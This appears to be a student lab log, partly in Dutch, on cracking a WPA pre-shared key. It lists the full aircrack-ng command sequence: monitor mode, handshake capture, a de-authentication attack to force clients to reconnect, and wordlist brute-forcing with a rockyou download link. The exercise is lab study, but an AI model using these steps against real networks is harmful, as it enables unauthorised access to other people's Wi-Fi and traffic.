# 10/12/2015

## Steps/Commands

### **WPA**
Wifi Protected Access (WPA) is a wireless security protocol that were intended to adres the security shortcoming of WEP. Because the WPA protocols dinamicaly generate a new key for each packet they prevent the statistical analysis that caused WEP to fail.
WPA is frequently deployed with a PreShared Key (PSK) to secure communication between the access point and wireless clients. The PSK should be a random pass phrase of at least 13 characters in length. If not it is possible to determine the PSK using a brute force attack by comparing the PSK to a known dictionary.

**Window 1**
The first step is to create a monitor interface using the airmon-ng comment. Before you start the monitor interface mode, you need to stop the network manager service first. Now we can start it. The airodump-ng comment will list all the available access points in its range. When you find your target press ctrl+c to stop it. 
The –showack is to ensure that the client computer acknowledges your request to the authenticated from the wireless access point. The –w argument is to write the output to a file. Don’t close this window and open another window
> service network-manager stop
> airmon-ng start "INTERFACE"
> airodump-ng mon0
> airodump-ng --bssid "BSSID" -c "Channel" --showack -w wpa_log "INTERFACE"



**New window**
In this window we will launch a de-authentication attack. This attack will force a user to re-authentication to the target access point and re-exchange the WPA key (reconnect automatically -> windows default settings). We use airplay-ng for the de-authentication attack. 0 indicates that we are launching a de-authentication attack. 20 indicates that we will send 20 de-authentication packets. De –a en –c zijn de BSSID en clientmac adres.
When we switch back to the previous window and ensure that we captured the 4way handshake. Displays on top right corner of the window (wpa handshake).
Once we have this handshake captured we can start cracking. We will use the aircrack-ng to crack the WPA key using a defined word list.
> aireplay-ng -0 20 -a "BSSID" -c "HOSTMAC" "INTERFACE"
> Ctrl + c
> Clear
> aircrack-ng wpa_log-01.cap -w "path to wordlist"
> - wpa_log-01.cap => Filename where airodump logs every packet (You can change the filename with -w)
> - "path to wordlist" !? WPA doesn't have the weakness in IV's like WEP has. We have to bruteforce the password. The wordlist is a text file containing possibilities (aka common passwords). An example is [rockyou](http://scrapmaker.com/download/data/wordlists/dictionaries/rockyou.txt)

### Some comments

We didn't do it on the RPi2 because:
* Hardware is te traag voor bruteforcing
* It took ages to download the rockyou file @ school
* Bruteforcing is quite useless with the "random" generated passwords as default. (takes to long)

The bruteforcing can be speed up by using the GPU power.
